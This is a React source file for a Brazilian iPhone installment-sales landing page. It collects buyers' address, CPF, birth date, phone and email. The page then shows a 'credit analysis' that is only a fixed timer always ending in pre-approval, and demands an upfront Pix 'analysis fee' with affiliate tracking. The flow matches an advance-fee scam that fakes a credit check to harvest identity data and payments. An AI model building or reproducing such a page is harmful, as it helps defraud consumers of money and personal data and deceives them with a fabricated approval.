import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useMemo, useState } from "react";
import {
  ArrowLeft,
  BadgeCheck,
  CheckCircle2,
  MapPin,
  PlayCircle,
  ShieldCheck,
  Smartphone,
  Truck,
  UserRound,
} from "lucide-react";
import heroImage from "@/assets/hero-iphones.jpg";
import logoAsset from "@/assets/gorillaphone-logo.png.asset.json";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Toaster } from "@/components/ui/sonner";
import { PixCheckout } from "@/components/PixCheckout";
import {
  ANALYSIS_FEE,
  BRL,
  INSTALLMENT_OPTIONS,
  IPHONES,
  installmentValue,
  monthlyRate,
  totalValue,
  type Iphone,
} from "@/lib/iphones";
import { maskCEP, maskCPF, maskDate, maskPhone, maskedCPFTail } from "@/lib/format";

const TITLE = "Gorillaphonebh — iPhone parcelado no boleto em até 48x";
const DESCRIPTION =
  "Parcele seu iPhone no boleto em até 48x, com aprovação simples e entrega em todo o Brasil. iPhones lacrados e semi-novos com preço à vista e simulação de parcelas.";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: TITLE },
      { name: "description", content: DESCRIPTION },
      { property: "og:title", content: TITLE },
      { property: "og:description", content: DESCRIPTION },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: Index,
});

type Step = 0 | 1 | 2 | 3 | 4;

type Address = { cep: string; rua: string; numero: string; bairro: string; cidade: string; uf: string };
type Person = { nome: string; cpf: string; nascimento: string; telefone: string; email: string };

function Index() {
  const [step, setStep] = useState<Step>(0);
  const [selected, setSelected] = useState<Iphone | null>(null);
  const [installments, setInstallments] = useState(48);
  const [address, setAddress] = useState<Address>({
    cep: "",
    rua: "",
    numero: "",
    bairro: "",
    cidade: "",
    uf: "",
  });
  const [person, setPerson] = useState<Person>({
    nome: "",
    cpf: "",
    nascimento: "",
    telefone: "",
    email: "",
  });
  const [affiliate, setAffiliate] = useState<string | null>(null);

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    setAffiliate(params.get("ref") ?? params.get("afiliado"));
  }, []);

  useEffect(() => {
    if (step > 0) {
      document.getElementById("fluxo")?.scrollIntoView({ behavior: "smooth", block: "start" });
    }
  }, [step]);

  const lacrados = IPHONES.filter((p) => p.condition === "lacrado");
  const semiNovos = IPHONES.filter((p) => p.condition === "semi-novo");

  return (
    <main className="min-h-screen bg-background">
      <Toaster />
      <Header affiliate={affiliate} />
      <Hero onStart={() => document.getElementById("fluxo")?.scrollIntoView({ behavior: "smooth" })} />
      <VideoSection />

      <section id="fluxo" className="mx-auto max-w-5xl scroll-mt-20 px-4 pb-24">
        <Stepper step={step} />

        {step === 0 && (
          <SelectPhone
            lacrados={lacrados}
            semiNovos={semiNovos}
            selected={selected}
            installments={installments}
            onInstallments={setInstallments}
            onSelect={(p) => {
              setSelected(p);
              setStep(1);
            }}
          />
        )}

        {step === 1 && selected && (
          <AddressStep
            selected={selected}
            installments={installments}
            address={address}
            onChange={setAddress}
            onBack={() => setStep(0)}
            onNext={() => setStep(2)}
          />
        )}

        {step === 2 && (
          <PersonStep
            person={person}
            onChange={setPerson}
            onBack={() => setStep(1)}
            onNext={() => setStep(3)}
          />
        )}

        {step === 3 && selected && (
          <ApprovedStep
            selected={selected}
            installments={installments}
            person={person}
            onNext={() => setStep(4)}
          />
        )}

        {step === 4 && selected && (
          <div className="mt-8 space-y-6">
            <PixCheckout
              amount={ANALYSIS_FEE}
              seed={person.cpf || selected.id}
              affiliate={affiliate}
            />
            <button
              onClick={() => setStep(3)}
              className="mx-auto flex items-center gap-2 text-sm text-muted-foreground hover:text-foreground"
            >
              <ArrowLeft className="size-4" /> Voltar
            </button>
          </div>
        )}
      </section>

      <footer className="border-t border-border px-4 py-10 text-center text-sm text-muted-foreground">
        <img
          src={logoAsset.url}
          alt="Gorillaphone"
          width={900}
          height={611}
          className="mx-auto mb-3 h-12 w-auto"
        />
        <p className="mt-1">iPhones lacrados e semi-novos • Entrega em todo o Brasil 🇧🇷</p>
        <p className="mt-3 text-xs">
          Valores de parcelamento simulados com taxa média de mercado de {(monthlyRate(48) * 100).toFixed(2)}% a.m.
          para 48x. Sujeito à análise de crédito.
        </p>
      </footer>
    </main>
  );
}

function Header({ affiliate }: { affiliate: string | null }) {
  return (
    <header className="sticky top-0 z-30 border-b border-border/60 bg-background/80 backdrop-blur">
      <div className="mx-auto flex max-w-6xl items-center justify-between px-4 py-3">
        <div className="flex items-center gap-3">
          <img
            src={logoAsset.url}
            alt="Gorillaphone — logo"
            width={900}
            height={611}
            className="h-10 w-auto"
          />
        </div>
        <div className="hidden items-center gap-2 text-xs text-muted-foreground sm:flex">
          <ShieldCheck className="size-4 text-primary" />
          Compra segura
          {affiliate && <span className="ml-2 rounded-full bg-secondary px-2 py-1">ref: {affiliate}</span>}
        </div>
      </div>
    </header>
  );
}

function Hero({ onStart }: { onStart: () => void }) {
  return (
    <section className="relative overflow-hidden">
      <div className="glow-top pointer-events-none absolute inset-x-0 top-0 h-[420px]" />
      <div className="mx-auto grid max-w-6xl items-center gap-10 px-4 py-16 sm:py-24 lg:grid-cols-2">
        <div className="relative">
          <span className="inline-flex items-center gap-2 rounded-full border border-border bg-secondary/60 px-3 py-1 text-xs font-medium text-muted-foreground">
            <BadgeCheck className="size-3.5 text-primary" /> Aprovação em minutos
          </span>
          <h1 className="mt-5 text-4xl leading-[1.05] font-extrabold sm:text-6xl">
            Parcele seu <span className="text-gradient-brand">iPhone no boleto</span> em até 48x
          </h1>
          <p className="mt-5 max-w-lg text-lg text-muted-foreground">
            Sem cartão de crédito, sem burocracia. Escolha o modelo, simule as parcelas e receba em
            casa com entrega em todo o Brasil 🇧🇷
          </p>
          <div className="mt-8 flex flex-wrap gap-3">
            <Button variant="hero" size="xl" onClick={onStart}>
              <Smartphone /> Selecionar meu iPhone
            </Button>
            <Button variant="outline" size="xl" asChild>
              <a href="#video">
                <PlayCircle /> Ver apresentação
              </a>
            </Button>
          </div>
          <ul className="mt-8 grid gap-3 text-sm text-muted-foreground sm:grid-cols-3">
            {[
              { icon: Truck, label: "Entrega nacional" },
              { icon: ShieldCheck, label: "Garantia inclusa" },
              { icon: BadgeCheck, label: "Boleto em até 48x" },
            ].map(({ icon: Icon, label }) => (
              <li key={label} className="flex items-center gap-2">
                <Icon className="size-4 text-primary" /> {label}
              </li>
            ))}
          </ul>
        </div>

        <div className="relative">
          <img
            src={heroImage}
            alt="iPhone premium em fundo escuro com iluminação de estúdio"
            width={1600}
            height={1008}
            className="rounded-3xl border border-border shadow-[var(--shadow-glow)]"
          />
        </div>
      </div>
    </section>
  );
}

function VideoSection() {
  return (
    <section id="video" className="mx-auto max-w-4xl scroll-mt-20 px-4 pb-16">
      <h2 className="text-center text-2xl font-bold sm:text-3xl">Como funciona</h2>
      <p className="mt-2 text-center text-muted-foreground">
        Assista ao vídeo de apresentação e entenda o processo em 1 minuto.
      </p>
      <div className="card-elevated mt-6 grid aspect-video place-items-center overflow-hidden">
        <div className="text-center">
          <PlayCircle className="mx-auto size-14 text-primary" />
          <p className="mt-3 text-sm text-muted-foreground">
            Espaço reservado para o vídeo apresentativo — envie o link/arquivo para publicarmos aqui.
          </p>
        </div>
      </div>
    </section>
  );
}

const STEP_LABELS = ["iPhone", "Endereço", "Dados", "Pré-aprovação", "Pagamento"];

function Stepper({ step }: { step: Step }) {
  return (
    <ol className="flex flex-wrap items-center gap-x-3 gap-y-2 pt-10 text-xs">
      {STEP_LABELS.map((label, i) => (
        <li key={label} className="flex items-center gap-2">
          <span
            className={`grid size-6 place-items-center rounded-full font-bold ${
              i <= step ? "bg-gradient-brand text-primary-foreground" : "bg-secondary text-muted-foreground"
            }`}
          >
            {i + 1}
          </span>
          <span className={i <= step ? "font-semibold" : "text-muted-foreground"}>{label}</span>
          {i < STEP_LABELS.length - 1 && <span className="text-muted-foreground">›</span>}
        </li>
      ))}
    </ol>
  );
}

function InstallmentPicker({
  value,
  onChange,
}: {
  value: number;
  onChange: (n: number) => void;
}) {
  return (
    <div className="flex flex-wrap gap-2">
      {INSTALLMENT_OPTIONS.map((n) => (
        <button
          key={n}
          onClick={() => onChange(n)}
          className={`rounded-full border px-4 py-2 text-sm font-semibold transition-colors ${
            value === n
              ? "border-primary bg-primary/15 text-primary"
              : "border-border text-muted-foreground hover:text-foreground"
          }`}
        >
          {n}x
        </button>
      ))}
    </div>
  );
}

function PhoneCard({
  phone,
  installments,
  onSelect,
}: {
  phone: Iphone;
  installments: number;
  onSelect: () => void;
}) {
  const parcela = installmentValue(phone.price, installments);
  return (
    <button
      onClick={onSelect}
      className="card-elevated group p-5 text-left transition-transform hover:-translate-y-1 hover:border-primary/50"
    >
      <div className="flex items-start justify-between gap-3">
        <div>
          <p className="font-display text-base font-bold">{phone.name}</p>
          <p className="text-sm text-muted-foreground">{phone.storage}</p>
        </div>
        <span className="rounded-full bg-secondary px-2 py-1 text-[10px] font-semibold tracking-wide text-muted-foreground uppercase">
          {phone.condition}
        </span>
      </div>
      <p className="mt-4 text-sm text-muted-foreground">
        à vista <span className="font-semibold text-foreground">{BRL(phone.price)}</span>
      </p>
      <p className="mt-1 text-lg font-bold text-gradient-brand">
        {installments}x de {BRL(parcela)}
      </p>
      <p className="mt-3 text-xs font-semibold text-primary opacity-0 transition-opacity group-hover:opacity-100">
        Selecionar →
      </p>
    </button>
  );
}

function SelectPhone({
  lacrados,
  semiNovos,
  selected,
  installments,
  onInstallments,
  onSelect,
}: {
  lacrados: Iphone[];
  semiNovos: Iphone[];
  selected: Iphone | null;
  installments: number;
  onInstallments: (n: number) => void;
  onSelect: (p: Iphone) => void;
}) {
  return (
    <div className="mt-8">
      <h2 className="text-2xl font-bold sm:text-3xl">Selecione o seu iPhone</h2>
      <p className="mt-2 text-muted-foreground">
        Escolha o número de parcelas para ver o valor. As taxas aumentam conforme o prazo.
      </p>
      <div className="mt-5">
        <InstallmentPicker value={installments} onChange={onInstallments} />
        <p className="mt-2 text-xs text-muted-foreground">
          Taxa aplicada: {(monthlyRate(installments) * 100).toFixed(2)}% a.m.
        </p>
      </div>

      <h3 className="mt-10 text-lg font-bold">📱 Aparelhos lacrados</h3>
      <div className="mt-4 grid gap-4 sm:grid-cols-2 lg:grid-cols-3">
        {lacrados.map((p) => (
          <PhoneCard key={p.id} phone={p} installments={installments} onSelect={() => onSelect(p)} />
        ))}
      </div>

      <h3 className="mt-10 text-lg font-bold">📲 Semi-novos</h3>
      <div className="mt-4 grid gap-4 sm:grid-cols-2 lg:grid-cols-3">
        {semiNovos.map((p) => (
          <PhoneCard key={p.id} phone={p} installments={installments} onSelect={() => onSelect(p)} />
        ))}
      </div>

      {selected && (
        <p className="mt-6 text-sm text-muted-foreground">
          Selecionado: {selected.name} {selected.storage}
        </p>
      )}
    </div>
  );
}

function Summary({ selected, installments }: { selected: Iphone; installments: number }) {
  const parcela = installmentValue(selected.price, installments);
  return (
    <div className="card-elevated p-5">
      <p className="text-xs tracking-wide text-muted-foreground uppercase">Seu pedido</p>
      <p className="mt-2 font-display text-lg font-bold">
        {selected.name} · {selected.storage}
      </p>
      <p className="mt-1 text-sm text-muted-foreground">
        {selected.condition === "lacrado" ? "Lacrado" : "Semi-novo"} • à vista {BRL(selected.price)}
      </p>
      <p className="mt-3 text-xl font-bold text-gradient-brand">
        {installments}x de {BRL(parcela)}
      </p>
      <p className="text-xs text-muted-foreground">
        Total parcelado {BRL(totalValue(selected.price, installments))}
      </p>
    </div>
  );
}

function Field({
  label,
  value,
  onChange,
  placeholder,
  type = "text",
  inputMode,
}: {
  label: string;
  value: string;
  onChange: (v: string) => void;
  placeholder?: string;
  type?: string;
  inputMode?: "text" | "numeric" | "email" | "tel";
}) {
  const id = label.toLowerCase().replace(/\W/g, "-");
  return (
    <div className="space-y-2">
      <Label htmlFor={id}>{label}</Label>
      <Input
        id={id}
        type={type}
        inputMode={inputMode}
        value={value}
        placeholder={placeholder}
        onChange={(e) => onChange(e.target.value)}
      />
    </div>
  );
}

function AddressStep({
  selected,
  installments,
  address,
  onChange,
  onBack,
  onNext,
}: {
  selected: Iphone;
  installments: number;
  address: Address;
  onChange: (a: Address) => void;
  onBack: () => void;
  onNext: () => void;
}) {
  const [loadingCep, setLoadingCep] = useState(false);
  const valid = address.cep.replace(/\D/g, "").length === 8 && address.rua && address.numero && address.cidade;

  async function lookupCep(cep: string) {
    const digits = cep.replace(/\D/g, "");
    if (digits.length !== 8) return;
    setLoadingCep(true);
    try {
      const res = await fetch(`https://viacep.com.br/ws/${digits}/json/`);
      const data = (await res.json()) as Record<string, string>;
      if (!data['erro']) {
        onChange({
          ...address,
          cep: maskCEP(cep),
          rua: data['logradouro'] ?? "",
          bairro: data['bairro'] ?? "",
          cidade: data['localidade'] ?? "",
          uf: data['uf'] ?? "",
        });
      }
    } catch {
      /* segue com preenchimento manual */
    } finally {
      setLoadingCep(false);
    }
  }

  return (
    <div className="mt-8 grid gap-6 lg:grid-cols-[1fr_320px]">
      <div className="card-elevated p-6">
        <h2 className="flex items-center gap-2 text-xl font-bold">
          <MapPin className="size-5 text-primary" /> Endereço de entrega
        </h2>
        <div className="mt-6 grid gap-4 sm:grid-cols-2">
          <Field
            label="CEP"
            inputMode="numeric"
            value={address.cep}
            placeholder="00000-000"
            onChange={(v) => {
              onChange({ ...address, cep: maskCEP(v) });
              void lookupCep(v);
            }}
          />
          <Field
            label="Número"
            inputMode="numeric"
            value={address.numero}
            onChange={(v) => onChange({ ...address, numero: v })}
          />
          <div className="sm:col-span-2">
            <Field label="Rua" value={address.rua} onChange={(v) => onChange({ ...address, rua: v })} />
          </div>
          <Field label="Bairro" value={address.bairro} onChange={(v) => onChange({ ...address, bairro: v })} />
          <Field label="Cidade" value={address.cidade} onChange={(v) => onChange({ ...address, cidade: v })} />
          <Field label="Estado (UF)" value={address.uf} onChange={(v) => onChange({ ...address, uf: v.toUpperCase().slice(0, 2) })} />
        </div>
        {loadingCep && <p className="mt-3 text-xs text-muted-foreground">Buscando endereço…</p>}
        <div className="mt-6 flex flex-wrap gap-3">
          <Button variant="outline" onClick={onBack}>
            <ArrowLeft /> Voltar
          </Button>
          <Button variant="hero" size="lg" disabled={!valid} onClick={onNext}>
            Continuar
          </Button>
        </div>
      </div>
      <Summary selected={selected} installments={installments} />
    </div>
  );
}

function PersonStep({
  person,
  onChange,
  onBack,
  onNext,
}: {
  person: Person;
  onChange: (p: Person) => void;
  onBack: () => void;
  onNext: () => void;
}) {
  const valid =
    person.nome.trim().split(" ").length >= 2 &&
    person.cpf.replace(/\D/g, "").length === 11 &&
    person.nascimento.length === 10 &&
    person.telefone.replace(/\D/g, "").length >= 10 &&
    /\S+@\S+\.\S+/.test(person.email);

  return (
    <div className="mt-8 card-elevated p-6">
      <h2 className="flex items-center gap-2 text-xl font-bold">
        <UserRound className="size-5 text-primary" /> Seus dados
      </h2>
      <p className="mt-2 text-sm text-muted-foreground">
        Usamos seus dados apenas para a análise de crédito e emissão dos boletos.
      </p>
      <div className="mt-6 grid gap-4 sm:grid-cols-2">
        <div className="sm:col-span-2">
          <Field label="Nome completo" value={person.nome} onChange={(v) => onChange({ ...person, nome: v })} />
        </div>
        <Field
          label="CPF"
          inputMode="numeric"
          placeholder="000.000.000-00"
          value={person.cpf}
          onChange={(v) => onChange({ ...person, cpf: maskCPF(v) })}
        />
        <Field
          label="Data de nascimento"
          inputMode="numeric"
          placeholder="DD/MM/AAAA"
          value={person.nascimento}
          onChange={(v) => onChange({ ...person, nascimento: maskDate(v) })}
        />
        <Field
          label="Telefone"
          inputMode="tel"
          placeholder="(00) 00000-0000"
          value={person.telefone}
          onChange={(v) => onChange({ ...person, telefone: maskPhone(v) })}
        />
        <Field
          label="E-mail"
          type="email"
          inputMode="email"
          value={person.email}
          onChange={(v) => onChange({ ...person, email: v })}
        />
      </div>
      <div className="mt-6 flex flex-wrap gap-3">
        <Button variant="outline" onClick={onBack}>
          <ArrowLeft /> Voltar
        </Button>
        <Button variant="hero" size="lg" disabled={!valid} onClick={onNext}>
          Analisar meu crédito
        </Button>
      </div>
    </div>
  );
}

function ApprovedStep({
  selected,
  installments,
  person,
  onNext,
}: {
  selected: Iphone;
  installments: number;
  person: Person;
  onNext: () => void;
}) {
  const [analyzing, setAnalyzing] = useState(true);
  useEffect(() => {
    const t = setTimeout(() => setAnalyzing(false), 2200);
    return () => clearTimeout(t);
  }, []);

  const cpf = useMemo(() => maskedCPFTail(person.cpf), [person.cpf]);

  if (analyzing) {
    return (
      <div className="card-elevated mt-8 p-10 text-center">
        <div className="mx-auto size-10 animate-spin rounded-full border-2 border-border border-t-primary" />
        <p className="mt-4 font-semibold">Consultando seu CPF…</p>
        <p className="text-sm text-muted-foreground">Isso leva apenas alguns segundos.</p>
      </div>
    );
  }

  return (
    <div className="mt-8 grid gap-6 lg:grid-cols-[1fr_320px]">
      <div className="card-elevated p-6 sm:p-8">
        <CheckCircle2 className="size-10 text-[var(--success)]" />
        <h2 className="mt-4 text-2xl font-bold">
          Parabéns, {person.nome.split(" ")[0]}! Seu iPhone está{" "}
          <span className="text-gradient-brand">pré-aprovado</span>
        </h2>
        <p className="mt-2 text-muted-foreground">
          Pré-aprovação registrada para o CPF <span className="font-semibold text-foreground">{cpf}</span> —{" "}
          {selected.name} {selected.storage} em {installments}x de{" "}
          {BRL(installmentValue(selected.price, installments))}.
        </p>
        <div className="mt-6 rounded-2xl border border-primary/40 bg-primary/10 p-5">
          <p className="font-semibold">
            Para dar continuidade na análise, faça o pagamento do custo de análise
          </p>
          <p className="mt-1 text-sm text-muted-foreground">
            Valor único de {BRL(ANALYSIS_FEE)} via Pix, usado para a consulta completa e reserva do
            aparelho.
          </p>
        </div>
        <Button variant="hero" size="xl" className="mt-6" onClick={onNext}>
          Gerar Pix da análise
        </Button>
      </div>
      <Summary selected={selected} installments={installments} />
    </div>
  );
}
